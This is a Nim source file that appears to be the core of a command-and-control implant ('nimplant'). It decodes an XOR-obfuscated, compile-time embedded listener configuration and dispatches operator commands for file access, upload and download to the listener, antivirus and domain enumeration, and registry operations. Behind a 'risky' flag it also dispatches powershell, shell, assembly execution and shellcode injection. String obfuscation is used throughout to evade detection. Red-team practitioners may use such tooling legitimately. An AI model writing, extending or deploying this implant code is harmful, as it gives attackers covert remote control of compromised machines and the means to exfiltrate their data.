import parsetoml, strutils, tables
from crypto import xorStringToByteSeq, xorByteSeqToString

include ../commands/[cat, cd, cp, curl, download, env, getAv, getDom, getLocalAdm, ls, mkdir, mv, ps, pwd, reg, rm, run, upload, wget, whoami]
when defined risky:
    include ../commands/risky/[executeAssembly, inlineExecute, powershell, shell, shinject]

# Parse the configuration file
# This constant will be stored in the binary itself (hence the XOR)
proc parseConfig*() : Table[string, string] =
    var config = initTable[string, string]()

    # Allow us to re-write the static XOR key used for pre-crypto operations
    # This is handled by the Python wrapper at compile time, the default value shouldn't be used
    const xor_key {.intdefine.}: int = 459457925

    # Embed the configuration as a XORed sequence of bytes at COMPILE-time
    const embeddedConf = xorStringToByteSeq(staticRead(obf("../../config.toml")), xor_key)
    
    # Decode the configuration at RUNtime and parse the TOML to store it in a basic table
    var tomlConfig = parsetoml.parseString(xorByteSeqToString(embeddedConf, xor_key))
    config[obf("hostname")] = tomlConfig[obf("listener")][obf("hostname")].getStr()
    config[obf("listenerType")] = tomlConfig[obf("listener")][obf("type")].getStr()
    config[obf("listenerIp")] = tomlConfig[obf("listener")][obf("ip")].getStr()
    config[obf("listenerPort")] = $tomlConfig[obf("listener")][obf("port")].getInt()
    config[obf("listenerRegPath")] = tomlConfig[obf("listener")][obf("registerPath")].getStr()
    config[obf("listenerTaskPath")] = tomlConfig[obf("listener")][obf("taskPath")].getStr()
    config[obf("listenerResPath")] = tomlConfig[obf("listener")][obf("resultPath")].getStr()

    config[obf("killDate")] = $tomlConfig[obf("nimplant")][obf("killDate")].getStr()
    config[obf("sleepTime")] = $tomlConfig[obf("nimplant")][obf("sleepTime")].getInt()
    config[obf("sleepJitter")] = $tomlConfig[obf("nimplant")][obf("sleepJitter")].getInt()
    config[obf("userAgent")] = tomlConfig[obf("nimplant")][obf("userAgent")].getStr()

    return config     

# Parse user commands that do not affect the listener object here
proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =

    try:
        # Parse the received command
        # This code isn't too pretty, but using 'case' optimizes away the string obfuscation used here
        if cmd == obf("cat"):
            result = cat(args)
        elif cmd == obf("cd"):
            result = cd(args)
        elif cmd == obf("cp"):
            result = cp(args)
        elif cmd == obf("curl"):
            result = curl(li, args)
        elif cmd == obf("download"):
            result = download(li, cmdGuid, args)
        elif cmd == obf("env"):
            result = env()
        elif cmd == obf("getav"):
            result = getAv()
        elif cmd == obf("getdom"):
            result = getDom()
        elif cmd == obf("getlocaladm"):
            result = getLocalAdm()
        elif cmd == obf("ls"):
            result = ls(args)
        elif cmd == obf("mkdir"):
            result = mkdir(args)
        elif cmd == obf("mv"):
            result = mv(args)
        elif cmd == obf("ps"):
            result = ps()
        elif cmd == obf("pwd"):
            result = pwd()
        elif cmd == obf("reg"):
            result = reg(args)
        elif cmd == obf("rm"):
            result = rm(args)
        elif cmd == obf("run"):
            result = run(args)
        elif cmd == obf("upload"):
            result = upload(li, cmdGuid, args)
        elif cmd == obf("wget"):
            result = wget(li, args)
        elif cmd == obf("whoami"):
            result = whoami()
        else:
            # Parse risky commands, if enabled
            when defined risky:
                if cmd == obf("execute-assembly"):
                    result = executeAssembly(li, args)
                elif cmd == obf("inline-execute"):
                    result = inlineExecute(li, args)
                elif cmd == obf("powershell"):
                    result = powershell(args)
                elif cmd == obf("shell"):
                    result = shell(args)
                elif cmd == obf("shinject"):
                    result = shinject(li, args)
                else:
                    result = obf("ERROR: An unknown command was received.")
            else:
                result = obf("ERROR: An unknown command was received.")
    
    # Catch unhandled exceptions during command execution (commonly OS exceptions)
    except:
        let
            msg = getCurrentExceptionMsg()

        result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg